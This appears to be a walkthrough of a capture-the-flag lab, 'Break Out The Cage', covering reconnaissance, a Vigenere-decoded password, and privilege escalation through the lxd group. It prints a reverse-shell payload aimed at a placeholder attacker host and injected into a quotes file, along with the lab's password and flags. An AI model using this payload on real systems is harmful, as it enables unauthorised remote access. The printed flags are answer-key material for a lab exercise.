
# Break Out The Cage

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.67.99 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

Select running services with

```bash
$ cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o
```

[x] 21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3

[x] 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

[x] 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

We'll start with anonymous login to ftp. It contains a file called "dad_tasks", there's
an encoded message inside.

```
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJPISEhIQpTZncuIEtham5tYiB4c2kgb3d1b3dnZQpGYXouIFRtbCBma2ZyIHFnc2VpayBhZyBvcWVpYngKRWxqd3guIFhpbCBicWkgYWlrbGJ5d3FlClJzZnYuIFp3ZWwgdnZtIGltZWwgc3VtZWJ0IGxxd2RzZmsKWWVqci4gVHFlbmwgVnN3IHN2bnQgInVycXNqZXRwd2JuIGVpbnlqYW11IiB3Zi4KCkl6IGdsd3cgQSB5a2Z0ZWYuLi4uIFFqaHN2Ym91dW9leGNtdndrd3dhdGZsbHh1Z2hoYmJjbXlkaXp3bGtic2lkaXVzY3ds
```

decode it:

```bash
$ cat dad_tasks | base64 -d
```

```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

I used [Boxentrique](https://www.boxentriq.com/code-breaking/cipher-identifier) to
deduce the cipher. Surprise-surprise: it's Vigenere!

I also tried to automatically deduce the key, but no luck. So I tried annother service -
[f00l](https://f00l.de/hacking/vigenere.php)

So I tried then to deduce the length of key:

![step-1](https://i.postimg.cc/ncvDktG2/vigenere-step-1.png)

And automatically crack it based on the length:

![step-2](https://i.postimg.cc/nzDzhvd2/vigenere-step-2.png)

But the site doesn't give us the clertext, so let's see what did we get:

![step-3](https://i.postimg.cc/pLcXQ04k/vigenere-step-3.png)

It resembles the name of file that we've found earlier lying around: "dads tasks"
So I tried to guess the key based on the possible cleartext:

![step-4](https://i.postimg.cc/JnZrLRnd/vigenere-step-4.png)

And we got a first part of the key! We now know it looks like namelesst*

Ok, it's definitely a phrase. We can go back to Boxentrique and try to recover a few 
more letters. With the key "namelessthe", the note partially makes sense:

![step-5](https://i.postimg.cc/ZR712gPD/vigenere-step-5.png)

Lets navigate back to f00l and use the same cracking option as in step 3: by ciphertext
and cleartext.

Grab the first line of ciphertext and remove everything except letters and whitespaces:

> Qapw Eekcl Pvr RMKP XZW VWUR TTI XEF LAA ZRGQRO

Next, grab the corresponding ciphertext and remove everything except letters and 
whitespaces as well. Then, change it a bit, so it would make sense:

> Dads Tasks The RAGE THE Rage THE MAN THE LEGEND

![step-6](https://i.postimg.cc/mZdHpSvz/vigenere-step-6.png)

The generated key is... ***namelesstwoname***

Clearly, it started repeting itself. The real key is ***namelesstwo***

Decoded message:

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

- What is Weston's password?

We have no idea, who the hell Weston is, but we got his password )0))0)0))0

> Mydadisghostrideraintthatcoolnocausehesonfirejokes

Ok, let's start investigating the http service:

```bash
$ ./ffuf -u http://10.10.67.99/FUZZ -ic -t 55 -of html -o ~/CTF/BreakOutTheCage/ffuf-report.html -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Results:

```
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 65ms]
html                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 60ms]
scripts                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 52ms]
contracts               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 55ms]
auditions               [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 59ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 61ms]
```

Turns out, under /auditions there's an mp3 file. You can use audacity to analyze it.
You'll hear some noise. Select the "Show spectrogram" option in the left dropdown
and take a closer look to the section, where the noise starts:

![audacity](https://i.postimg.cc/tCWBxTv4/audacity.png)

- What's the user flag?

Ok, let's login as weston via ssh.

Find all files, writable by our group:

```bash
$ find / -type f -perm /g=w 2>/dev/null | tee writable.txt
```

A suspicious file "/opt/.dads_scripts/.files/.quotes" appears. After a bit of browsing,
we find out that random strings are selected from it and broadcasted by concatenating
with "wall" command. We can simply replace the content of .quotes with the following
content:

```
aaa; bash -c '0<&196;exec 196<>/dev/tcp/$ATTACKER_IP/$ATTACKER_PORT; sh <&196 >&196 2>&196';
```

Then just read ***Super_Duper_Checklist*** file

> THM{M37AL_0R_P3N_T35T1NG}

- What's the root flag?

```bash
$ id
```

We are in ***lxd*** group. This can be used for [privesc](https://www.hackingarticles.in/lxd-privilege-escalation/). Just repeat the steps in this article.

> THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
